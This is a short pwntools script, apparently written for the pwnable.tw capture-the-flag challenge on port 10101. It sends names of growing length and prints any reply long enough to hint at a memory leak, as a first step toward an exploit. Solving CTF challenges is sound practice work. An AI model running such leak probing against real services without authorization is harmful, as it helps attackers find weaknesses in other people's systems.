from pwn import *

for i in range(1, 65):
    print(i)
    r = remote("chall.pwnable.tw", 10101)
    r.sendafter(b'name :', b'A'*i)
    leak_str = r.readuntil(b'How')
    if len(leak_str) > i+10: 
        print(f'string leak for {i}')
        print(leak_str)
    r.close()